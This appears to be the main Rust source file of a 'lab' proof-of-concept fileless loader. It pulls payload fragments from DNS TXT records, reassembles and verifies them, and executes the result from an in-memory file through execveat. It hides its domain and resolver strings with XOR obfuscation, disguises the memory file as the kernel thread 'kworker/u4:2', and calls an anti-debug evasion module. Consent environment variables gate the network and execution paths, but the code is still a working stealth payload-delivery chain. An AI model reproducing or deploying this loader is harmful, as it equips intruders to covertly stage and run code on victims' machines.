mod concurrency;
mod evasion;
mod fragments;
mod logger;
mod manifest;
mod membrane;
mod network_t_rna;
mod ribosome;
mod splicer;
mod syscalls;
#[macro_use]
mod obfuscator;

use evasion::Evasion;
use fragments::Fragment;
use manifest::{manifest_for_payload, PayloadManifest};
use membrane::Membrane;
use network_t_rna::DnsTxtSource;
use ribosome::Ribosome;
use splicer::Splicer;

const MANIFEST_VERSION: u16 = 1;
const NETWORK_CONSENT_ENV: &str = "RIBOSOME_LAB_NETWORK";
const NETWORK_CONSENT_VALUE: &str = "1";
const EXEC_CONSENT_ENV: &str = "RIBOSOME_LAB_EXEC";
const EXEC_CONSENT_VALUE: &str = "I_ACCEPT_LAB_RISK";
const EXPECTED_FRAGMENTS_ENV: &str = "RIBOSOME_EXPECTED_FRAGMENTS";
const EXPECTED_LEN_ENV: &str = "RIBOSOME_EXPECTED_LEN";
const EXPECTED_CHECKSUM_ENV: &str = "RIBOSOME_EXPECTED_CHECKSUM64";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Mode {
    Audit,
    Fetch,
    Execute,
    LocalExec,
    DiagnoseEnv,
    Help,
}

impl Mode {
    fn from_args() -> Result<Self, String> {
        let mut args = std::env::args().skip(1);
        match args.next().as_deref() {
            None | Some("--audit") => Ok(Self::Audit),
            Some("--fetch") => Ok(Self::Fetch),
            Some("--execute") => Ok(Self::Execute),
            Some("--local-exec") => Ok(Self::LocalExec),
            Some("--diagnose-env") => Ok(Self::DiagnoseEnv),
            Some("--help") | Some("-h") => Ok(Self::Help),
            Some(other) => Err(format!("unknown mode: {other}")),
        }
    }
}

fn main() {
    let mode = match Mode::from_args() {
        Ok(mode) => mode,
        Err(e) => exit_with(64, e),
    };

    if mode == Mode::Help {
        print_usage();
        return;
    }

    if mode == Mode::DiagnoseEnv {
        run_environment_diagnostics();
        return;
    }

    let manifest = match mode {
        Mode::Audit | Mode::LocalExec => manifest_for_payload(
            MANIFEST_VERSION,
            &crate::splicer::AssembledPayload {
                data: lab_fragments()[0].data.clone(),
                fragment_count: 1,
            },
        ), // Hack for lab manifest length
        Mode::Fetch | Mode::Execute => match manifest_from_env() {
            Ok(manifest) => manifest,
            Err(e) => exit_with(30, e),
        },
        Mode::DiagnoseEnv | Mode::Help => unreachable!(),
    };

    if mode == Mode::Audit {
        eprintln!("[+] Audit mode complete. No network or exec path was used.");
        return;
    }

    if mode == Mode::Execute || mode == Mode::Fetch {
        if let Err(e) = require_env(NETWORK_CONSENT_ENV, NETWORK_CONSENT_VALUE) {
            exit_with(10, e);
        }
        if mode == Mode::Execute {
            if let Err(e) = require_env(EXEC_CONSENT_ENV, EXEC_CONSENT_VALUE) {
                exit_with(40, e);
            }
        }
    }

    print_manifest("expected", &manifest);

    // Concurrency Setup
    // Concurrency Setup
    // Capacity 4096 is enough for the 3212 chunks of our payload
    static RING: concurrency::RingBuffer<Fragment, 4096> = concurrency::RingBuffer::new();

    let expected_fragments = manifest.fragment_count;

    // --- Thread 0: FETCHER ---
    let fetcher_thread = std::thread::spawn(move || {
        let _ = concurrency::pin_to_core(0); // Optional: ignore if fails (e.g. fewer cores)

        if mode == Mode::LocalExec {
            for frag in lab_fragments() {
                while RING.push(frag.clone()).is_err() {
                    core::hint::spin_loop();
                }
            }
        } else {
            // DNS Fetching
            eprintln!("[*] Fetching payload fragments via DNS TXT (explicit lab mode)...");
            const DOMAIN: crate::obfuscator::ObfuscatedString<18> =
                obf!(b"payload.test.local", 0x3C);
            const RESOLVER: crate::obfuscator::ObfuscatedString<14> = obf!(b"127.0.0.1:5354", 0x51);
            let mut domain_clear = DOMAIN.decrypt();
            let mut resolver_clear = RESOLVER.decrypt();
            let dns_source = DnsTxtSource::new(
                std::str::from_utf8(&domain_clear).unwrap(),
                std::str::from_utf8(&resolver_clear).unwrap(),
            );

            for seq in 0..=u16::MAX {
                if let Some(frag) = dns_source.fetch_seq(seq) {
                    logger::BitLogger::log_event(logger::LogEvent::FetchFragment {
                        seq: frag.sequence_id,
                        len: frag.data.len(),
                    });
                    while RING.push(frag.clone()).is_err() {
                        core::hint::spin_loop();
                    }
                    if (seq as usize + 1) == expected_fragments {
                        break;
                    }
                } else {
                    break;
                }
            }
            crate::syscalls::secure_zero(&mut domain_clear);
            crate::syscalls::secure_zero(&mut resolver_clear);
        }
    });

    // --- Thread 1: SPLICER ---
    let splicer_thread = std::thread::spawn(move || {
        let _ = concurrency::pin_to_core(1);

        let mut payload = match Splicer::assemble_concurrent(&RING, expected_fragments) {
            Ok(payload) => payload,
            Err(e) => exit_with(20, format!("SpliceError: {e}")),
        };

        if let Err(e) = manifest.verify(MANIFEST_VERSION, &payload) {
            exit_with(31, format!("ManifestError: {e}"));
        }

        eprintln!(
            "[+] Payload verified: {} bytes from {} fragments",
            payload.data.len(),
            payload.fragment_count
        );

        if mode == Mode::LocalExec || mode == Mode::Execute {
            execute_verified_payload(&mut payload.data);
        } else {
            eprintln!(
                "[+] Fetch mode complete. Payload verified; execution intentionally skipped."
            );
        }
    });

    // Wait for completion
    fetcher_thread.join().unwrap();
    splicer_thread.join().unwrap();
}

fn lab_fragments() -> Vec<Fragment> {
    vec![Fragment {
        sequence_id: 0,
        data: b"#!/bin/sh\necho \"Hello from memory\"\n".to_vec(),
    }]
}

fn fetch_dns_fragments() -> Vec<Fragment> {
    eprintln!("[*] Fetching payload fragments via DNS TXT (explicit lab mode)...");

    // payload.test.local -> len 18
    const DOMAIN: crate::obfuscator::ObfuscatedString<18> = obf!(b"payload.test.local", 0x3C);
    // 8.8.8.8:53 -> len 10
    const RESOLVER: crate::obfuscator::ObfuscatedString<10> = obf!(b"8.8.8.8:53", 0x51);

    let mut domain_clear = DOMAIN.decrypt();
    let mut resolver_clear = RESOLVER.decrypt();

    let dns_source = DnsTxtSource::new(
        std::str::from_utf8(&domain_clear).unwrap(),
        std::str::from_utf8(&resolver_clear).unwrap(),
    );

    let mut frags = Vec::new();
    for seq in 0..=(u8::MAX as u16) {
        if let Some(frag) = dns_source.fetch_seq(seq) {
            frags.push(frag);
        } else {
            eprintln!("[+] Received EOF or timeout on sequence {}", seq);
            break;
        }
    }

    crate::syscalls::secure_zero(&mut domain_clear);
    crate::syscalls::secure_zero(&mut resolver_clear);

    frags
}

fn execute_verified_payload(data: &mut Vec<u8>) -> ! {
    // kworker/u4:2\0 -> len 13
    // Spoof the memfd name to look like a legitimate kernel thread
    const VFS_NAME: crate::obfuscator::ObfuscatedString<13> = obf!(b"kworker/u4:2\0", 0x7A);
    let mut vfs_name_decrypted = VFS_NAME.decrypt();

    let fd = match Membrane::create_and_fill(&vfs_name_decrypted, data) {
        Ok(fd) => {
            crate::syscalls::secure_zero(&mut vfs_name_decrypted);
            fd
        }
        Err(e) => exit_with(50, format!("MembraneError: {e}")),
    };

    eprintln!("[*] Translating verified payload via execveat(AT_EMPTY_PATH)...");
    match Ribosome::translate(fd) {
        Ok(infallible) => match infallible {},
        Err(e) => exit_with(51, format!("TranslateError: {e}")),
    }
}

fn manifest_from_env() -> Result<PayloadManifest, String> {
    Ok(PayloadManifest::new(
        MANIFEST_VERSION,
        parse_env_usize(EXPECTED_FRAGMENTS_ENV)?,
        parse_env_usize(EXPECTED_LEN_ENV)?,
        parse_env_u64(EXPECTED_CHECKSUM_ENV)?,
    ))
}

fn parse_env_usize(name: &str) -> Result<usize, String> {
    let raw = std::env::var(name).map_err(|_| format!("missing required env var {name}"))?;
    raw.trim()
        .parse::<usize>()
        .map_err(|_| format!("invalid usize in env var {name}: {raw}"))
}

fn parse_env_u64(name: &str) -> Result<u64, String> {
    let raw = std::env::var(name).map_err(|_| format!("missing required env var {name}"))?;
    let trimmed = raw.trim();
    if let Some(hex) = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
    {
        return u64::from_str_radix(hex, 16)
            .map_err(|_| format!("invalid hex u64 in env var {name}: {raw}"));
    }
    trimmed
        .parse::<u64>()
        .map_err(|_| format!("invalid u64 in env var {name}: {raw}"))
}

fn require_env(name: &str, expected: &str) -> Result<(), String> {
    match std::env::var(name) {
        Ok(found) if found == expected => Ok(()),
        Ok(found) => Err(format!(
            "refusing unsafe path: {name} must be {expected:?}, found {found:?}"
        )),
        Err(_) => Err(format!(
            "refusing unsafe path: set {name}={expected} to acknowledge lab-only execution"
        )),
    }
}

fn exit_with(code: i32, message: impl AsRef<str>) -> ! {
    eprintln!("[!] {}", message.as_ref());
    std::process::exit(code);
}

fn run_environment_diagnostics() {
    eprintln!("[*] Running explicit environment diagnostics...");
    match Evasion::verify_environment() {
        Ok(()) => eprintln!("[+] Environment diagnostics passed."),
        Err(e) => exit_with(60, format!("Environment diagnostic failed: {e}")),
    }
}

fn print_manifest(label: &str, manifest: &PayloadManifest) {
    eprintln!(
        "[*] {label} manifest: version={}, fragments={}, len={}, checksum64=0x{:016x}",
        manifest.version, manifest.fragment_count, manifest.total_len, manifest.checksum64
    );
}

fn print_usage() {
    eprintln!("usage: ribosome-poc [--audit|--fetch|--execute|--diagnose-env]");
    eprintln!("  --audit        assemble built-in lab fragments; default, no network, no exec");
    eprintln!("  --fetch        fetch DNS TXT fragments and verify against env manifest; no exec");
    eprintln!("  --execute      fetch, verify, then execute only with explicit lab consent");
    eprintln!("  --diagnose-env run anti-debug/timing diagnostics explicitly");
    eprintln!();
    eprintln!("required for --fetch/--execute:");
    eprintln!("  {NETWORK_CONSENT_ENV}={NETWORK_CONSENT_VALUE}");
    eprintln!("  {EXPECTED_FRAGMENTS_ENV}=<count>");
    eprintln!("  {EXPECTED_LEN_ENV}=<bytes>");
    eprintln!("  {EXPECTED_CHECKSUM_ENV}=<decimal-or-0xhex>");
    eprintln!();
    eprintln!("additional required for --execute:");
    eprintln!("  {EXEC_CONSENT_ENV}={EXEC_CONSENT_VALUE}");
}
